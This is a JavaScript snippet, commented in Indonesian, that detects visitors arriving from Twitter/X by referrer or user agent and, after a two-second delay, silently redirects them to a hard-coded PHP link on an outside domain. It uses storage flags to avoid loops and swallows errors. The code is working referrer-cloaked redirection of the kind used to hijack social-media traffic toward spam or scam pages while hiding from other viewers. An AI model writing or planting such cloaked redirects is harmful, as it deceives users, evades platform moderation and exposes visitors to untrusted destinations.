(function () {
  try {
    var cooldownMs = 20 * 1000;   // jeda antar redirect
    var delayMs    = 2000;        // delay sebelum redirect (ms)
    var target     = "https://vidoy.fun/cB6Tyq0.php"; // link tujuan fix

    var qs = location.search + location.hash;
    if (/[?#](?:.*[&?])?noredir=1/i.test(qs)) return;

    // deteksi Twitter/X
    var REF = document.referrer || "";
    var UA  = navigator.userAgent || "";
    var isX = /(t\.co|twitter\.com|x\.com)/i.test(REF) || /twitter/i.test(UA);
    if (!isX) return;

    // anti-loop
    var page = location.origin + location.pathname;
    var sessKey = "redir_x_seen:" + page;
    var cdKey   = "redir_x_cd:"   + page;
    var now = Date.now();
    if (sessionStorage.getItem(sessKey)) return;
    if (now < (+localStorage.getItem(cdKey) || 0)) return;
    sessionStorage.setItem(sessKey,"1");
    localStorage.setItem(cdKey, now + cooldownMs);

    // redirect otomatis setelah delay
    setTimeout(function () {
      location.href = target;
    }, delayMs);

  } catch(_) {}
})();
